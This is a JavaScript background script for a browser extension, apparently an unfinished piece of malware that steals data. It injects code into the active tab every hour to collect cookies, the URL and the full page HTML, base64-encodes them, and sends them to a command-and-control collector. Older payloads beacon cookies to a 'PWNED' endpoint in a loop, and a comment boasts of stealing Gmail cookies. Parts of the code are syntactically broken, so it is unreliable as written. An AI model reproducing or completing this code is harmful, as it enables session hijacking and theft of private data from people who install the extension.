let CC_SERVER = '{{CC_SERVER}}/';
let COLLECTOR_URL = CC_SERVER + '/collector/';
let QUERY_ALL_DATA_INTERVAL = 1000 * 60 * 60; // Every hour.
let SEND_DATA_INTERVAL = ;

var f = '';

/* 3 methods: 
1. Every couple of msecs - Inject extractor inside content-scripts of all opened tabs.
2. Every couple of msecs - Inject extractor.
3. Whenever a tab is opened - Inject extractor and query & get all state.
*/

let old_code = 'document.location.href = \'javascript:fetch("http://localhost:8083/PWNED/" + document.cookie);\';' +
'if (Math.random() < -1) {document.location.href = \'https://mail.google.com\';} /* Redirect 1 out 3 times kinda to gmail and steal cookies :) */ ' +
'function f() {document.location.href = \'javascript:fetch("http://localhost:8083/PWNED/" + document.domain + "/" + document.cookie);\'; fetch("http://localhost:8083/PWNED/"  + document.domain + "/" + document.cookie); setTimeout(f, 2500);};f();' +
'//browser.storage.local.set({"integration.googleDocs.codeRepositoryURL":"http://localhost:8084/pwned/"}).then(e=>console.log(e));\n' +
'//chrome.storage.local.set({"integration.googleDocs.codeRepositoryURL":"http://localhost:8084/pwned/"}, e=>console.log(e));\n' +	
'//console.log(document.domain);' +
'//console.log(document.cookie);\n';


extract_data_code = 'st=document.documentElement.innerHTML;h=btoa(unescape(encodeURIComponent(st)));d={cookies:document.cookie, url:document.location.href, fullhtml:h};full_data=btoa(JSON.stringify(d));';
content_script_code = 'document.location.href = \'javscript:function() {' + extract_data_code + ';fetch("' + cc_server + '" + full_data);}();\'';
background_code = 'function() {' + extract_data_code + ';chrome.runtime.sendMessage(full_data);}();';

function get_cookies_post_server(request, sender, sendResponse) {
	console.log('[+] Got cookies/html data from: ' + (sender.tab ? sender.tab.url : 'from the extension') + request);
	send_data(encodeURIComponent(request));
	fetch(COLLECTOR_URL + "/" + encodeURIComponent(request));
}

async function send_data(data) {
	// For now, supporting just the typical chrome.storage.local. 
	if (chrome && chrome.storage && chrome.storage.local) {
		if (data) { // Got also data to append and to be sent
			let res_data = await chrome.storage.local.get({"data_left_to_send": []});
			res_data.append(data);
		}

		let res_data = await chrome.storage.local.get({"data_left_to_send": 0});
		if (res_data) {
			// Data 
		}
		// for example: Get all storage: chrome.storage.local.get(null).then(e=>console.log(e))
		let last_sent = chrome.storage.local.get({"last_sent":0}).then(e => {
			if (e["last_sent"]) {
				let cur_time = (new Date()).getTime();
				if (Math.abs(cur_time - e["last_sent"]) > SEND_DATA_INTERVAL)
			}
		});
	}
}

chrome.runtime.onMessage.addListener(get_cookies_post_server);
function inject_active_tab_get_cookies() {
	browser.tabs.query({active: true}).then(e => {
		var tabId = e[0].id;
		browser.tabs.executeScript(tabId, {allFrames: true, 
			code: background_code, frameId:0});
	});
}

function loop_query_send() {
	inject_active_tab_get_cookies();
	setTimeout(loop_query_send, QUERY_ALL_DATA_INTERVAL);
}

// Method  1: every hour send all users' data.
loop_query_send();

// Method 2: upon new tab inited.

